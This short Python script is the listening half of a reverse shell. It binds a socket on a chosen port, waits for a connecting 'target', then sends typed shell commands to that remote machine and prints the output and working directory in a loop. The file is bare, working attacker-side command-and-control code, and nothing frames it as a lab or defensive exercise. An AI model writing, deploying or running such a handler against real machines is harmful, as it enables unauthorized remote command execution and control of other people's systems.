import socket

HOST = '0.0.0.0'
PORT = int(input("Enter your port: "))
print(PORT)
SEPARATOR = "<sep>"
BUFFER_SIZE = 1024 * 128

# set up the socket so that it waits for an incoming connection
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)
print(f'[*] listening as {HOST}:{PORT}')

# waiting for the target and sent a welcome message if it connected
client_s, client_addr = s.accept()
print(f'[*] client connected {client_addr}')

cwd = client_s.recv(BUFFER_SIZE).decode()

# this loop will run, until you enter 'quit'
while True:

    # 1. enter the command and send it to the target
    cmd = input(f'{cwd}$>')

    if not cmd.strip():
        # empty command
        continue

    client_s.send(cmd.encode())
    # check if you want to quit
    if cmd.lower() == 'quit' or cmd.lower() == 'exit':
        break

    # retrieve command results
    output = client_s.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)